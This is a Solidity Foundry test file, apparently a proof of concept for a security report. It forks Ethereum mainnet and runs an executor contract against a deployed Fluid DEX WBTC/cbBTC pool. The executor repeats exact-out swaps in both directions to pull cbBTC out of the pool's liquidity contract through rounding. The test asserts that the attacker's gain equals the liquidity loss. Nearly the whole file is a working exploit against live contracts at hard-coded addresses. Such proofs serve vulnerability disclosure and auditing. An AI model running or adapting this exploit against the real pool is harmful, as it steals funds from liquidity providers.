// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.21;

import { Test } from "forge-std/Test.sol";

interface IERC20BA {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IFluidDexExactOut {
    function readFromStorage(bytes32 slot) external view returns (uint256);
    function swapOut(bool swap0to1, uint256 amountOut, uint256 amountInMax, address to)
        external payable returns (uint256 amountIn);
}

contract WbtcCbbtcCycleExecutor {
    address immutable pool;
    address immutable wbtc;
    address immutable cbbtc;

    constructor(address pool_, address wbtc_, address cbbtc_) {
        pool = pool_;
        wbtc = wbtc_;
        cbbtc = cbbtc_;
        require(IERC20BA(wbtc_).approve(pool_, type(uint256).max), "WBTC_APPROVE");
        require(IERC20BA(cbbtc_).approve(pool_, type(uint256).max), "CBBTC_APPROVE");
    }

    function cycle(uint256 outCbBtc, uint256 rounds)
        external returns (int256 deltaWbtc, int256 deltaCbBtc, uint256 firstPaidWbtc, uint256 lastPaidCbBtc)
    {
        uint256 beforeWbtc = IERC20BA(wbtc).balanceOf(address(this));
        uint256 beforeCbBtc = IERC20BA(cbbtc).balanceOf(address(this));
        for (uint256 i; i < rounds; ++i) {
            uint256 paidWbtc = IFluidDexExactOut(pool).swapOut(
                true, outCbBtc, type(uint256).max, address(this)
            );
            uint256 paidCbBtc = IFluidDexExactOut(pool).swapOut(
                false, paidWbtc, type(uint256).max, address(this)
            );
            if (i == 0) firstPaidWbtc = paidWbtc;
            lastPaidCbBtc = paidCbBtc;
        }
        deltaWbtc = int256(IERC20BA(wbtc).balanceOf(address(this))) - int256(beforeWbtc);
        deltaCbBtc = int256(IERC20BA(cbbtc).balanceOf(address(this))) - int256(beforeCbBtc);
    }
}

contract ActiveWbtcCbbtcRoundingExtractionTest is Test {
    address constant POOL = 0x3C0441B42195F4aD6aa9a0978E06096ea616CDa7;
    address constant LIQUIDITY = 0x52Aa899454998Be5b000Ad077a46Bbe360F4e497;
    address constant WBTC = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;
    address constant CBBTC = 0xcbB7C0000aB88B473b1f5aFd9ef808440eed33Bf;
    uint256 constant OUT_CBBTC = 101;

    event BitcoinCycleProof(
        uint256 blockNumber,
        uint256 feeRaw,
        uint256 rounds,
        uint256 firstPaidWbtc,
        uint256 lastPaidCbBtc,
        int256 attackerDeltaWbtc,
        int256 attackerDeltaCbBtc,
        uint256 liquidityLossCbBtc,
        uint256 gasUsed
    );

    function setUp() public {
        vm.createSelectFork(vm.envString("MAINNET_RPC_URL"));
    }

    function test_deployedWbtcCbBtcCycleAndRepetition() public {
        uint256 packed = IFluidDexExactOut(POOL).readFromStorage(bytes32(uint256(1)));
        uint256 feeRaw = (packed >> 2) & ((1 << 17) - 1);
        assertEq(feeRaw, 45, "unexpected fee");
        assertEq(packed & 3, 3, "both smart pools should be active");
        assertEq(packed >> 255, 0, "pool paused");

        WbtcCbbtcCycleExecutor executor = new WbtcCbbtcCycleExecutor(POOL, WBTC, CBBTC);
        deal(WBTC, address(executor), 1_000_000);

        uint256 rounds = 32;
        uint256 liquidityWbtcBefore = IERC20BA(WBTC).balanceOf(LIQUIDITY);
        uint256 liquidityCbBtcBefore = IERC20BA(CBBTC).balanceOf(LIQUIDITY);
        uint256 gasBefore = gasleft();
        (int256 deltaWbtc, int256 deltaCbBtc, uint256 firstPaidWbtc, uint256 lastPaidCbBtc) =
            executor.cycle(OUT_CBBTC, rounds);
        uint256 gasUsed = gasBefore - gasleft();
        uint256 liquidityWbtcAfter = IERC20BA(WBTC).balanceOf(LIQUIDITY);
        uint256 liquidityCbBtcAfter = IERC20BA(CBBTC).balanceOf(LIQUIDITY);

        assertEq(deltaWbtc, 0, "initial WBTC not restored");
        assertGt(deltaCbBtc, 0, "no cbBTC extracted");
        assertEq(liquidityWbtcAfter, liquidityWbtcBefore, "Liquidity WBTC changed");
        assertEq(
            liquidityCbBtcBefore - liquidityCbBtcAfter,
            uint256(deltaCbBtc),
            "attacker gain != Liquidity loss"
        );

        emit BitcoinCycleProof(
            block.number,
            feeRaw,
            rounds,
            firstPaidWbtc,
            lastPaidCbBtc,
            deltaWbtc,
            deltaCbBtc,
            liquidityCbBtcBefore - liquidityCbBtcAfter,
            gasUsed
        );
    }
}
